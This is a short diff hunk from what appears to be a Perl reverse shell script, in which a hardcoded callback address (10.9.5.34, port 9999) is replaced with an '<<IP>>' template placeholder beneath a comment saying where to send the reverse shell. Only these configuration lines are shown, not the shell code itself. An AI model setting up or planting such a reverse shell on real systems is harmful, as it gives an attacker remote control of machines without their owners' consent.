@@ -42,7 +42,7 @@ use POSIX;
 my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
-my $ip = '10.9.5.34';
+my $ip = '<<IP>>';
 my $port = 9999;
 
 # Options
